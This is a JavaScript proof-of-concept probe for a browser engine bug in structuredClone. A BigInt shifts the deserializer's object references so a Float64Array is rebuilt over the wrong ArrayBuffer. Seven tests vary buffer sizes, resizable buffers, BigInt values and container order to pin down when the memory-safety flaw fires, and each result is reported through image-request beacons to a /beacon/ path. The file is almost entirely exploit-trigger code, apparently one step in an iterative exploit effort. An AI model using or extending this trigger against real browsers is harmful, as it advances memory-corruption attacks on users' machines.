// p315 - structuredClone pool mismatch v2: deeper diagnostics
//
// V285 showed NO-MISMATCH despite source confirming bug exists.
// This probe adds marker-based identity checks and tests multiple
// serialization orderings to find the exact trigger conditions.
//
// Bug 265975: BigInt appended to deserializer m_gcBuffer shifts
// ObjectReference indices. TypedArray backing buffer gets wrong buffer.
//
// Beacon prefix: V315-

(function() {
  var BQ = 0;
  function B(tag) {
    var url = '/beacon/V315-' + tag + '?t=' + Date.now() + '&q=' + (BQ++);
    try { new Image().src = url; } catch(e) {}
  }

  B('BOOT');

  // Feature gates
  try { var _t = 0n; } catch(e) { B('NO-BIGINT'); return; }
  try { var _r = new ArrayBuffer(8, {maxByteLength: 64}); } catch(e) { B('NO-RAB'); return; }

  // ========== TEST 1: MARKER IDENTITY (non-resizable) ==========
  // Use non-resizable buffers with unique marker values.
  // If mismatch happens, view reads wrong marker.
  try {
    var small1 = new ArrayBuffer(8);
    var large1 = new ArrayBuffer(64);
    new Float64Array(small1)[0] = 11111.11111;
    var lv1 = new Float64Array(large1);
    for (var i = 0; i < 8; i++) lv1[i] = 22222.22222 + i;

    var c1 = structuredClone({
      bi: 0n,
      s: small1,
      l: large1,
      v: new Float64Array(large1)
    });

    var readVal = c1.v[0];
    var vBufLen = c1.v.buffer.byteLength;
    // If mismatch: v.buffer = small (8 bytes), v[0] reads from small = 11111.11111
    // If no mismatch: v.buffer = large (64 bytes), v[0] = 22222.22222
    var isSmall = (Math.abs(readVal - 11111.11111) < 0.001);
    var isLarge = (Math.abs(readVal - 22222.22222) < 0.001);
    B('T1-VAL-' + readVal.toFixed(2));
    B('T1-BUFLEN-' + vBufLen);
    B('T1-ISSMALL-' + isSmall);
    B('T1-ISLARGE-' + isLarge);
    if (isSmall) B('T1-MISMATCH-CONFIRMED');
  } catch(e) {
    B('T1-ERR-' + e.message.substring(0, 40));
  }

  // ========== TEST 2: RESIZABLE + marker ==========
  try {
    var small2 = new ArrayBuffer(8, {maxByteLength: 1024});
    var large2 = new ArrayBuffer(128, {maxByteLength: 1024});
    new Float64Array(small2)[0] = 33333.33333;
    var lv2 = new Float64Array(large2);
    for (var i = 0; i < 16; i++) lv2[i] = 44444.44444 + i;

    var c2 = structuredClone({
      bi: 0n,
      s: small2,
      l: large2,
      v: new Float64Array(large2)
    });

    var rv2 = c2.v[0];
    var vbl2 = c2.v.buffer.byteLength;
    var isS2 = (Math.abs(rv2 - 33333.33333) < 0.001);
    var isL2 = (Math.abs(rv2 - 44444.44444) < 0.001);
    B('T2-VAL-' + rv2.toFixed(2));
    B('T2-BUFLEN-' + vbl2);
    B('T2-ISSMALL-' + isS2);
    if (isS2) B('T2-MISMATCH-CONFIRMED');
  } catch(e) {
    B('T2-ERR-' + e.message.substring(0, 40));
  }

  // ========== TEST 3: LARGE BigInt (definitely heap) ==========
  try {
    var small3 = new ArrayBuffer(8);
    var large3 = new ArrayBuffer(64);
    new Float64Array(small3)[0] = 55555.55555;
    var lv3 = new Float64Array(large3);
    for (var i = 0; i < 8; i++) lv3[i] = 66666.66666 + i;

    var bigVal = 0x1234567890ABCDEFn; // definitely not BigInt32

    var c3 = structuredClone({
      bi: bigVal,
      s: small3,
      l: large3,
      v: new Float64Array(large3)
    });

    var rv3 = c3.v[0];
    var isS3 = (Math.abs(rv3 - 55555.55555) < 0.001);
    B('T3-VAL-' + rv3.toFixed(2));
    B('T3-BUFLEN-' + c3.v.buffer.byteLength);
    B('T3-ISSMALL-' + isS3);
    if (isS3) B('T3-MISMATCH-CONFIRMED');
  } catch(e) {
    B('T3-ERR-' + e.message.substring(0, 40));
  }

  // ========== TEST 4: Array wrapper (not plain object) ==========
  // Bug might need specific serialization order
  try {
    var small4 = new ArrayBuffer(8);
    var large4 = new ArrayBuffer(64);
    new Float64Array(small4)[0] = 77777.77777;
    var lv4 = new Float64Array(large4);
    for (var i = 0; i < 8; i++) lv4[i] = 88888.88888 + i;

    var c4 = structuredClone([0n, small4, large4, new Float64Array(large4)]);

    var rv4 = c4[3][0];
    var isS4 = (Math.abs(rv4 - 77777.77777) < 0.001);
    B('T4-VAL-' + rv4.toFixed(2));
    B('T4-BUFLEN-' + c4[3].buffer.byteLength);
    B('T4-ISSMALL-' + isS4);
    if (isS4) B('T4-MISMATCH-CONFIRMED');
  } catch(e) {
    B('T4-ERR-' + e.message.substring(0, 40));
  }

  // ========== TEST 5: Multiple BigInts for bigger shift ==========
  try {
    var s5 = new ArrayBuffer(8);
    var m5 = new ArrayBuffer(32);
    var l5 = new ArrayBuffer(64);
    new Float64Array(s5)[0] = 1.1;
    new Float64Array(m5)[0] = 2.2;
    var lv5 = new Float64Array(l5);
    for (var i = 0; i < 8; i++) lv5[i] = 3.3 + i;

    // 3 BigInts shift by 3
    // pool: [obj@0, s5@1, m5@2, l5@3, v@4]
    // gcBuffer: [obj@0, bi1@1, bi2@2, bi3@3, s5@4, m5@5, l5@6, v@7]
    // v references l5 via ObjectRef(3) -> gcBuffer[3] = bi3? No, bi3 is BigInt not ArrayBuffer
    // readTerminal would get bi3, which is not ArrayBuffer -> fail?

    var c5 = structuredClone({
      b1: 1n, b2: 2n, b3: 3n,
      s: s5, m: m5, l: l5,
      v: new Float64Array(l5)
    });

    var rv5 = c5.v[0];
    var isS5 = (Math.abs(rv5 - 1.1) < 0.001);
    var isM5 = (Math.abs(rv5 - 2.2) < 0.001);
    var isL5 = (Math.abs(rv5 - 3.3) < 0.001);
    B('T5-VAL-' + rv5.toFixed(2));
    B('T5-BUFLEN-' + c5.v.buffer.byteLength);
    B('T5-IS-S-' + isS5 + '-M-' + isM5 + '-L-' + isL5);
    if (isS5 || isM5) B('T5-MISMATCH-CONFIRMED');
  } catch(e) {
    B('T5-ERR-' + e.message.substring(0, 40));
  }

  // ========== TEST 6: Verify BigInt is in gcBuffer ==========
  // Clone a BigInt and an ArrayBuffer, check if cloned BigInt === input BigInt
  // (it shouldn't be, it should be a new BigInt)
  try {
    var testBuf = new ArrayBuffer(16);
    new Float64Array(testBuf)[0] = 99999.99999;

    var c6 = structuredClone({bi: 42n, buf: testBuf});
    B('T6-BI-TYPE-' + typeof c6.bi);
    B('T6-BI-VAL-' + String(c6.bi));
    B('T6-BUF-LEN-' + c6.buf.byteLength);
    B('T6-BUF-VAL-' + new Float64Array(c6.buf)[0].toFixed(2));
  } catch(e) {
    B('T6-ERR-' + e.message.substring(0, 40));
  }

  // ========== TEST 7: Direct buffer identity via maxByteLength ==========
  // Use different maxByteLength to distinguish buffers
  try {
    var s7 = new ArrayBuffer(8, {maxByteLength: 100});
    var l7 = new ArrayBuffer(64, {maxByteLength: 200});
    new Float64Array(s7)[0] = 11.11;
    var lv7 = new Float64Array(l7);
    for (var i = 0; i < 8; i++) lv7[i] = 22.22 + i;

    var c7 = structuredClone({bi: 0n, s: s7, l: l7, v: new Float64Array(l7)});

    var vBuf7 = c7.v.buffer;
    var maxBL = 'unknown';
    try { maxBL = vBuf7.maxByteLength; } catch(e) { maxBL = 'err'; }
    B('T7-VBUF-LEN-' + vBuf7.byteLength);
    B('T7-VBUF-MAXLEN-' + maxBL);
    // If mismatch: maxByteLength should be 100 (small), not 200 (large)
    if (maxBL == 100) B('T7-MISMATCH-CONFIRMED');
    if (maxBL == 200) B('T7-NO-MISMATCH');
  } catch(e) {
    B('T7-ERR-' + e.message.substring(0, 40));
  }

  B('DONE');
})();
